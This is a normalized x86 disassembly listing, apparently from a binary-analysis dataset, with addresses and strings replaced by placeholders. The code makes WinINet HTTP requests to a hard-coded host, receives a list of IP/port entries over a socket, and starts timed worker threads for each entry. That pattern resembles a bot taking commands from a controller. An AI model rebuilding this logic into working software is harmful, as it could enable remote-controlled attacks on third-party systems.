mov [ ebp - 0x568 ] 0x0
mov edx [ ebp - 0x560 ]
add edx 0x1
mov [ ebp - 0x560 ] edx
cmp [ ebp - 0x560 ] 0x10
jne r-xdata
mov ecx [ ebp - 0x570 ]
add ecx 0x1
mov [ ebp - 0x570 ] ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x564 ]
add edx 0x1
mov [ ebp - 0x564 ] edx
jmp r-xdata
jmp r-xdata
sub_402170
push ebp
mov ebp esp
push ecx
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
push 0x100
mov eax [ ebp + 0x8 ]
push eax
call sub_404cd8
add esp 0x10
mov esp ebp
pop ebp
retn
sub_4021c0
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1
jne r-xdata
mov eax rw-data
pop ebp
retn
mov ecx [ rw-data ]
or ecx 0x1
mov [ rw-data ] ecx
mov ecx rw-data
call sub_402200
push sub_410920
call sub_404e18
add esp 0x4
sub_402200
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi [ ebp - 0x4 ]
add edi 0xc
mov ecx 0x1a
mov esi r--data
[ edi ] [ esi ]
mov edi [ ebp - 0x4 ]
add edi 0x22314
mov ecx 0x10
mov esi r--data
[ edi ] [ esi ]
mov edi [ ebp - 0x4 ]
add edi 0x22354
mov ecx 0x6
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0x200
push 0x0
mov eax [ ebp - 0x4 ]
add eax 0x22114
push eax
call sub_40a4d0
add esp 0xc
push 0x22000
push 0x0
mov ecx [ ebp - 0x4 ]
add ecx 0x10c
push ecx
call sub_40a4d0
add esp 0xc
mov eax [ ebp - 0x4 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_402280
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
add eax 0xc
push eax
call [ InternetOpenA@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0xea60
push 0x4
lea ecx [ ebp - 0x8 ]
push ecx
push 0x2
mov edx [ ebp - 0x4 ]
push edx
call [ InternetSetOptionA@IAT ]
mov [ ebp - 0x8 ] 0x1d4c0
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x6
mov ecx [ ebp - 0x4 ]
push ecx
call [ InternetSetOptionA@IAT ]
mov [ ebp - 0x8 ] 0xea60
push 0x4
lea edx [ ebp - 0x8 ]
push edx
push 0x5
mov eax [ ebp - 0x4 ]
push eax
call [ InternetSetOptionA@IAT ]
push 0x0
mov ecx [ ebp + 0x14 ]
push ecx
push 0x3
push 0x0
push 0x0
movzx edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call [ InternetConnectA@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov [ edx ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x10 ]
mov [ ecx + 0x2210c ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x4 ] ecx
mov eax 0x1
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn 0x10
sub_402350
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
push edx
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x0
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push eax
call [ InternetCloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] 0x0
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x0
sub_4023c0
push ebp
mov ebp esp
sub esp 0xac4
mov [ ebp - 0xaa4 ] ecx
push 0x0
mov eax [ ebp - 0xaa4 ]
mov ecx [ eax + 0x2210c ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
push r--data
mov ecx [ ebp - 0xaa4 ]
mov edx [ ecx + 0x4 ]
push edx
call [ HttpOpenRequestA@IAT ]
mov ecx [ ebp - 0xaa4 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebp - 0xaa4 ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0xaa0 ] 0x0
push 0x1ff
push 0x0
lea eax [ ebp - 0xa9f ]
push eax
call sub_40a4d0
add esp 0xc
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x810 ] 0x0
push 0x7ff
push 0x0
lea ecx [ ebp - 0x80f ]
push ecx
call sub_40a4d0
add esp 0xc
mov edx [ ebp - 0xaa4 ]
add edx 0x22114
mov [ ebp - 0xaa8 ] edx
mov eax [ ebp - 0xaa8 ]
add eax 0x1
mov [ ebp - 0xaac ] eax
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xaa8 ]
mov dl [ ecx ]
mov [ ebp - 0xaad ] dl
add [ ebp - 0xaa8 ] 0x1
cmp [ ebp - 0xaad ] 0x0
jne r-xdata
mov eax [ ebp - 0xaa8 ]
sub eax [ ebp - 0xaac ]
mov [ ebp - 0xab4 ] eax
cmp [ ebp - 0xab4 ] 0xa
jbe r-xdata
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp - 0xaa4 ]
add eax 0x22314
push eax
lea ecx [ ebp - 0x810 ]
push ecx
call [ lstrcatA@IAT ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0xaa4 ]
add ecx 0x22114
push ecx
lea edx [ ebp - 0x810 ]
push edx
call [ lstrcatA@IAT ]
mov ecx [ ebp - 0xaa4 ]
add ecx 0x22354
push ecx
lea edx [ ebp - 0x810 ]
push edx
call [ lstrcatA@IAT ]
xor eax eax
mov [ ebp - 0x8a0 ] eax
mov [ ebp - 0x89c ] eax
mov [ ebp - 0x898 ] eax
mov [ ebp - 0x894 ] eax
mov [ ebp - 0x890 ] eax
mov [ ebp - 0x88c ] eax
mov [ ebp - 0x888 ] eax
mov [ ebp - 0x884 ] eax
mov [ ebp - 0x880 ] eax
mov [ ebp - 0x87c ] eax
mov [ ebp - 0x8a0 ] 0x28
mov [ ebp - 0x884 ] 0x0
lea ecx [ ebp - 0x810 ]
mov [ ebp - 0x898 ] ecx
mov edx [ ebp - 0x898 ]
push edx
call [ lstrlenA@IAT ]
mov [ ebp - 0x894 ] eax
lea eax [ ebp - 0x810 ]
mov [ ebp - 0xab8 ] eax
mov ecx [ ebp - 0xab8 ]
add ecx 0x1
mov [ ebp - 0xabc ] ecx
mov edx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0x810 ]
push eax
call [ lstrcatA@IAT ]
mov edx [ ebp - 0xab8 ]
mov al [ edx ]
mov [ ebp - 0xabd ] al
add [ ebp - 0xab8 ] 0x1
cmp [ ebp - 0xabd ] 0x0
jne r-xdata
mov ecx [ ebp - 0xab8 ]
sub ecx [ ebp - 0xabc ]
mov [ ebp - 0xac4 ] ecx
mov edx [ ebp - 0xc ]
push edx
lea eax [ ebp - 0xaa0 ]
push eax
mov ecx [ ebp - 0xac4 ]
push ecx
lea edx [ ebp - 0x810 ]
push edx
mov eax [ ebp - 0xaa4 ]
mov ecx [ eax + 0x8 ]
push ecx
call [ HttpSendRequestA@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x878 ] 0x0
push 0x63
push 0x0
lea edx [ ebp - 0x877 ]
push edx
call sub_40a4d0
add esp 0xc
push 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x878 ]
push ecx
push 0x13
mov edx [ ebp - 0xaa4 ]
mov eax [ edx + 0x8 ]
push eax
call [ HttpQueryInfoA@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
mov eax 0x1
jmp r-xdata
sub_402670
push ebp
mov ebp esp
push ecx
call sub_4021c0
mov ecx eax
call sub_402350
push __dos_header
push __dos_header
movzx eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4021c0
mov ecx eax
call sub_402280
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x14 ]
push edx
push 0x0
mov eax [ ebp + 0x10 ]
push eax
call sub_4021c0
mov ecx eax
call sub_4023c0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax 0x1
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_4026d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x3e80
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call sub_40a4d0
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x3e80 ] 0x0
push 0x80
push 0x0
mov edx [ ebp - 0x4 ]
add edx 0x3e84
push edx
call sub_40a4d0
add esp 0xc
mov eax [ ebp - 0x4 ]
add eax 0x3e84
push eax
push r--data
call sub_4012c0
add esp 0x8
mov ecx 0x1fa3
mov edx [ ebp - 0x4 ]
mov [ edx + 0x3f04 ] cx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_402740
push ebp
mov ebp esp
sub esp 0x84
push esi
push edi
mov [ ebp - 0x84 ] ecx
mov ecx 0x1a
mov esi r--data
lea edi [ ebp - 0x80 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov [ ebp - 0xc ] r--data
mov [ ebp - 0x8 ] r--data
xor eax eax
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x80 ]
push edx
push 0x50
push r--data
call sub_402670
add esp 0x10
call sub_4021c0
mov ecx eax
call sub_402350
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_4027a0
push ebp
mov ebp esp
sub esp 0x4bc
mov [ ebp - 0x4bc ] ecx
mov [ ebp - 0xa0 ] 0x0
push 0x7f
push 0x0
lea eax [ ebp - 0x9f ]
push eax
call sub_40a4d0
add esp 0xc
lea ecx [ ebp - 0xa0 ]
push ecx
push r--data
call sub_4012c0
add esp 0x8
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x2329
lea edx [ ebp - 0xa0 ]
push edx
call sub_403ab0
add esp 0x8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0x18 ]
add eax 0x6
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4a8 ] 0x0
push 0x3ff
push 0x0
lea ecx [ ebp - 0x4a7 ]
push ecx
call sub_40a4d0
add esp 0xc
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
mov [ ebp + edx - 0x4a8 ] eax
mov ecx [ ebp - 0x18 ]
add ecx 0x4
mov [ ebp - 0x18 ] ecx
lea edx [ ebp - 0x4a8 ]
mov [ ebp - 0x14 ] edx
mov eax 0xff00
mov ecx [ ebp - 0x14 ]
mov [ ecx ] ax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov [ edx + 0x2 ] eax
push 0x0
mov ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x4a8 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ send@IAT ]
mov [ ebp - 0xa4 ] eax
mov ecx [ ebp - 0xa4 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
xor eax eax
jmp r-xdata
push 0x14000
call sub_40496c
add esp 0x4
mov [ ebp - 0x4b8 ] eax
mov eax [ ebp - 0x4b8 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
push edx
call [ closesocket@IAT ]
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1c ] 0x0
push 0x14000
push 0x0
mov ecx [ ebp - 0x4 ]
push ecx
call sub_40a4d0
add esp 0xc
push 0x0
push 0x14000
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x1c ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ recv@IAT ]
mov [ ebp - 0xa4 ] eax
cmp [ ebp - 0xa4 ] 0x0
jle r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
call [ closesocket@IAT ]
mov eax 0x1
mov ecx [ ebp - 0x1c ]
add ecx [ ebp - 0xa4 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x4b0 ] edx
mov [ ebp - 0x4ac ] 0x0
mov eax [ ebp - 0x4b0 ]
movzx ecx [ eax ]
cmp ecx 0x1234
jne r-xdata
mov edx [ ebp - 0x4b0 ]
mov eax [ edx + 0x2 ]
cmp eax [ ebp - 0x1c ]
jne r-xdata
mov ecx [ ebp - 0x4ac ]
add ecx 0x6
mov [ ebp - 0x4ac ] ecx
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x4ac ]
mov eax [ edx ]
mov [ rw-data ] eax
mov ecx [ edx + 0x4 ]
mov [ rw-data ] ecx
mov dx [ edx + 0x8 ]
mov [ rw-data ] dx
mov eax [ ebp - 0x4ac ]
add eax 0xa
mov [ ebp - 0x4ac ] eax
movzx ecx [ rw-data ]
test ecx ecx
je r-xdata
movzx ecx [ rw-data ]
test ecx ecx
je r-xdata
movzx edx [ rw-data ]
imul edx edx 0x6
push edx
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x4ac ]
push eax
push rw-data
call sub_405260
add esp 0xc
movzx ecx [ rw-data ]
imul ecx ecx 0x6
add ecx [ ebp - 0x4ac ]
mov [ ebp - 0x4ac ] ecx
mov [ ebp - 0x4b4 ] 0x0
jmp r-xdata
movzx ecx [ rw-data ]
test ecx ecx
jne r-xdata
movzx edx [ rw-data ]
shl edx 0x1
push edx
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x4ac ]
push eax
push rw-data
call sub_405260
add esp 0xc
movzx ecx [ rw-data ]
mov edx [ ebp - 0x4ac ]
lea eax [ edx + ecx * 2 ]
mov [ ebp - 0x4ac ] eax
movzx eax [ rw-data ]
cmp [ ebp - 0x4b4 ] eax
jge r-xdata
push 0x3e80
push 0x0
mov edx [ ebp - 0x4bc ]
push edx
call sub_40a4d0
add esp 0xc
movzx ecx [ rw-data ]
mov edx [ ebp - 0x4b4 ]
shl edx 0x4
mov eax [ ebp - 0x4bc ]
mov [ eax + edx + 0x8 ] ecx
mov ecx [ ebp - 0x4b4 ]
imul ecx ecx 0x6
mov edx [ ebp - 0x4b4 ]
shl edx 0x4
mov eax [ ebp - 0x4bc ]
mov ecx [ ecx + rw-data ]
mov [ eax + edx ] ecx
mov edx [ ebp - 0x4b4 ]
imul edx edx 0x6
mov eax [ ebp - 0x4b4 ]
shl eax 0x4
mov ecx [ ebp - 0x4bc ]
mov dx [ edx + rw-data ]
mov [ ecx + eax + 0x4 ] dx
mov eax [ ebp - 0x4b4 ]
shl eax 0x4
mov ecx [ ebp - 0x4bc ]
mov [ ecx + eax + 0xc ] 0x1
mov edx [ ebp - 0x4b4 ]
shl edx 0x4
mov eax [ ebp - 0x4bc ]
mov [ eax + edx + 0xd ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4b4 ]
add edx 0x1
mov [ ebp - 0x4b4 ] edx
sub_402b20
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
mov [ rw-data ] 0x0
xor eax eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
call sub_402740
mov ecx [ ebp - 0xc ]
call sub_4027a0
mov [ ebp - 0x4 ] 0x7530
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x4 ]
jae r-xdata
jmp r-xdata
movzx eax [ rw-data ]
test eax eax
je r-xdata
movzx eax [ rw-data ]
test eax eax
je r-xdata
jmp r-xdata
push 0xa
call [ Sleep@IAT ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
sub_402b90
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_404500
add esp 0x4
mov ecx [ rw-data ]
add ecx 0x1
mov [ rw-data ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xa
jb r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x927c0
jae r-xdata
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
xor edx edx
mov ecx 0xa
div ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0xc ]
test edx edx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0xa
call [ Sleep@IAT ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
sub_402c50
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4044c0
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x8 ] 0xa
jb r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x927c0
jae r-xdata
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
xor edx edx
mov ecx 0xa
div ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0xc ]
test edx edx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0xa
call [ Sleep@IAT ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
sub_402d00
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x14 ] ecx
xor eax eax
mov esp ebp
pop ebp
retn
movzx ecx [ rw-data ]
cmp ecx 0x2
jne r-xdata
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
movzx eax [ rw-data ]
test eax eax
je r-xdata
movzx eax [ rw-data ]
cmp [ ebp - 0x4 ] eax
jge r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x4
add ecx [ ebp - 0x14 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
movzx eax [ edx + 0xc ]
cmp eax 0x1
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
movzx edx [ ecx + 0xd ]
test edx edx
jne r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
push sub_402c50
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x8 ]
mov [ edx + 0xd ] 0x1
mov eax [ ebp - 0x10 ]
push eax
call [ CloseHandle@IAT ]
sub_402dc0
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x14 ] ecx
xor eax eax
mov esp ebp
pop ebp
retn
movzx ecx [ rw-data ]
cmp ecx 0x1
jne r-xdata
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
movzx eax [ rw-data ]
test eax eax
je r-xdata
movzx eax [ rw-data ]
cmp [ ebp - 0x4 ] eax
jge r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x4
add ecx [ ebp - 0x14 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
movzx eax [ edx + 0xc ]
cmp eax 0x1
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
movzx edx [ ecx + 0xd ]
test edx edx
jne r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
push sub_402b90
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x8 ]
mov [ edx + 0xd ] 0x1
mov eax [ ebp - 0x10 ]
push eax
call [ CloseHandle@IAT ]
sub_402e80
push ebp
mov ebp esp
sub esp 0x4c
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x640
jge r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x6
add ecx rw-data
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x8 ] 0x640
jge r-xdata
mov eax [ ebp - 0xc ]
mov cl [ eax ]
mov [ ebp - 0x11 ] cl
add [ ebp - 0xc ] 0x1
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x18 ] edx
je r-xdata
xor eax eax
mov edx [ ebp - 0x8 ]
shl edx 0x6
add edx rw-data
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x30 ]
add eax 0x1
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x4 ]
shl ecx 0x6
add ecx rw-data
mov [ ebp - 0x20 ] ecx
mov ecx [ ebp - 0x30 ]
mov dl [ ecx ]
mov [ ebp - 0x35 ] dl
add [ ebp - 0x30 ] 0x1
cmp [ ebp - 0x35 ] 0x0
jne r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x34 ]
mov [ ebp - 0x3c ] eax
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sbb edx edx
sbb edx 0xffffffff
mov [ ebp - 0x28 ] edx
cmp [ ebp - 0x21 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x40 ] ecx
mov edx [ ebp - 0x8 ]
shl edx 0x6
add edx rw-data
mov [ ebp - 0x44 ] edx
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x48 ] eax
mov eax 0x1
jmp r-xdata
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x20 ]
mov al [ edx + 0x1 ]
mov [ ebp - 0x22 ] al
mov ecx [ ebp - 0x1c ]
cmp al [ ecx + 0x1 ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x40 ]
mov dl [ ecx ]
mov [ ebp - 0x49 ] dl
mov eax [ ebp - 0x44 ]
mov cl [ ebp - 0x49 ]
mov [ eax ] cl
mov edx [ ebp - 0x40 ]
add edx 0x1
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0x44 ]
add eax 0x1
mov [ ebp - 0x44 ] eax
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
add [ ebp - 0x20 ] 0x2
add [ ebp - 0x1c ] 0x2
cmp [ ebp - 0x22 ] 0x0
jne r-xdata
mov edx [ ebp - 0x20 ]
mov al [ edx ]
mov [ ebp - 0x21 ] al
mov ecx [ ebp - 0x1c ]
cmp al [ ecx ]
jne r-xdata
sub_402ff0
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x44 ] eax
movzx ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x44 ]
push edx
call [ inet_ntoa@IAT ]
push eax
push r--data
lea eax [ ebp - 0x40 ]
push eax
call sub_4045a0
add esp 0x10
mov [ ebp - 0x48 ] 0x0
jmp r-xdata
cmp [ ebp - 0x48 ] 0x640
jge r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x48 ]
shl edx 0x6
add edx rw-data
mov [ ebp - 0x4c ] edx
mov eax [ ebp - 0x4c ]
add eax 0x1
mov [ ebp - 0x50 ] eax
mov ecx [ ebp - 0x4c ]
mov dl [ ecx ]
mov [ ebp - 0x51 ] dl
add [ ebp - 0x4c ] 0x1
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4c ]
sub eax [ ebp - 0x50 ]
mov [ ebp - 0x58 ] eax
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x5c ] ecx
mov edx [ ebp - 0x48 ]
shl edx 0x6
add edx rw-data
mov [ ebp - 0x60 ] edx
mov ecx [ ebp - 0x48 ]
add ecx 0x1
mov [ ebp - 0x48 ] ecx
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x68 ] eax
cmp [ ebp - 0x61 ] 0x0
je r-xdata
push 0x40
push 0x0
mov edx [ ebp - 0x48 ]
shl edx 0x6
add edx rw-data
push edx
call sub_40a4d0
add esp 0xc
jmp r-xdata
mov [ ebp - 0x68 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x60 ]
mov cl [ eax + 0x1 ]
mov [ ebp - 0x62 ] cl
mov edx [ ebp - 0x5c ]
cmp cl [ edx + 0x1 ]
jne r-xdata
mov ecx [ ebp - 0x68 ]
mov [ ebp - 0x6c ] ecx
cmp [ ebp - 0x6c ] 0x0
jne r-xdata
add [ ebp - 0x60 ] 0x2
add [ ebp - 0x5c ] 0x2
cmp [ ebp - 0x62 ] 0x0
jne r-xdata
mov eax [ ebp - 0x60 ]
mov cl [ eax ]
mov [ ebp - 0x61 ] cl
mov edx [ ebp - 0x5c ]
cmp cl [ edx ]
jne r-xdata
sub_403100
push ebp
mov ebp esp
sub esp 0x34
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
mov al [ edx ]
mov [ ebp - 0xd ] al
add [ ebp - 0x8 ] 0x1
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movsx ecx [ eax ]
cmp ecx 0x3a
jne r-xdata
mov eax [ ebp - 0x28 ]
mov cl [ eax ]
mov [ ebp - 0x31 ] cl
mov edx [ ebp - 0x2c ]
mov al [ ebp - 0x31 ]
mov [ edx ] al
mov ecx [ ebp - 0x28 ]
add ecx 0x1
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x2c ]
add edx 0x1
mov [ ebp - 0x2c ] edx
cmp [ ebp - 0x31 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x1c ]
